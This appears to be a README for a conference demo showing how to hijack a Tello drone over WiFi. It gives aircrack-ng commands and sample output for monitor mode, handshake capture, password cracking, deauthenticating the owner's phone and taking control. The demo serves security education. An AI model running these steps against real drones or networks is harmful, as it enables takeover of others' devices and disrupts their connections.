# Girl Geek Dinners Oslo drone hacking demo code
Demo code and presentation for Girl Geek Dinners in Oslo February 4th 2019.

## Preparations

You need:

1. A laptop with Kali Linux
2. A network adapter that supports packet injection
3. A mobile phone with the Tello app

This github repo contains some files that will help you in the demo, but it is not a prerequisite to download it.

In order to program the drone (if you want that, this is optional, see step 6 below) you'll need the Go programming language and the Gobot framework (https://gobot.io):

```
git clone https://github.com/transcendent-group/ggd.git
apt install golang
cd ggd
go get -d -u gobot.io/x/gobot/...
```

## Demo walkthrough

### Step 1: Sniff and find the drone’s WiFi network

Begin by listing wireless interfaces that support monitor mode with:

```
airmon-ng
```

If you do not see an interface listed then your wireless card does not support monitor mode.

If it does, make sure that other interfering processes are killed, you should see output similar to this:

```
root@kali:~/ggd# airmon-ng check kill

Killing these processes:

  PID Name
  868 wpa_supplicant
```

Then list out the wireless interfaces you have with `iwconfig, you should see output similar to this:

```
root@kali:~/ggd# iwconfig
eth0      no wireless extensions.

lo        no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
```

We will assume your wireless interface name is `wlan0`:

```
airmon-ng start wlan0
```

This may create a new interface that is named something else, so be sure to check with `iwconfig` to use the correct interface name for the rest of the demo.

Then scan the networks:

```
root@kali:~/ggd# airodump-ng wlan0

 CH  3 ][ Elapsed: 1 min ][ 2019-02-03 09:50                                       
                                                                                                                                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                             
 70:85:C6:9C:BC:3E   -1   0        0        0    0   3  -1                    <length:  0>                                                                   
 D8:FE:E3:DD:5F:8A   -1   0        0        0    0   3  -1                    <length:  0>                                                                   
 60:60:1F:D4:21:28  -18 100      266    29646   47   3  54e. WPA2 CCMP   PSK  TELLO-D42128                                                                   
 80:37:73:BD:B5:42  -80   0        0        1    0   3  -1   WPA              <length:  0>                                                                    
 08:86:3B:B9:53:CA   -1   0        0        0    0   3  -1                    <length:  0>                                                                    
                                                                    
                                                                                                                                                              
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                    
                                                                                                                                                                                                                                         
 60:60:1F:D4:21:28  A4:D9:31:D8:7D:8C  -32   54e-54e  5993    30022  TELLO-D42128                                                                                              
```

Look for the network called `TELLO-D42128`, and make note of the `BSSID` (the Tello drone wifi access point MAC address), channel number and `STATION` (the controller's MAC address):
 In the above, these are:

* WiFi channel: `3`
* Tello drone MAC address: `60:60:1F:D4:21:28`
* Controller (iPhone) MAC address: `A4:D9:31:D8:7D:8C`

### Step 2: Capture a handshake

Stop listening on all channels, and set the right channel:

```
airmon-ng stop wlan0
airmon-ng start wlan0 3
```

Sniff the airwaves for a handshake:

```
airodump-ng -c 3 -b 60:60:1F:D4:21:28 -w ggd wlan0
```

You should see a that a WPA handshake has been captured after a while in the right topmost corner of the terminal window:

```
CH  8 ][ Elapsed: 12 s ][ 2019-02-03 10:03 ][ WPA handshake: 60:60:1F:D4:21:28  
```

### Step 3: Crack the handshake and obtain WiFi password

```
aircrack-ng ggd-01.cap -w passwords.txt
```

### Step 4: Deauthenticate me

Deauthenticate the iPhone controller:

```
aireplay-ng --deauth 0 -a 60:60:1F:D4:21:28 -c A4:D9:31:D8:7D:8C wlan0
```

### Step 5: Hijack the drone!

Keep the above command running, and connect to the `TELLO-D42128` network with the password from step 3. Start the Tello app on your phone, and takeoff!

### Step 6 (optional): Connect to the drone from you laptop and program it to do some sweet flips

Open a text editor and insert the correct password in the `wpa_supplicant.conf` file.

Then disable monitor mode, and start wpa_supplicant:

```
airmon-ng stop wlan0
wpa_supplicant -i wlan0 -c wpa_supplicant.conf -D nl80211
```

In another terminal window check that you are connected, and ask for an IP:

```
iwconfig
dhclient wlan0
```

Then compile and run:

```
go build flip.go
./flip
```




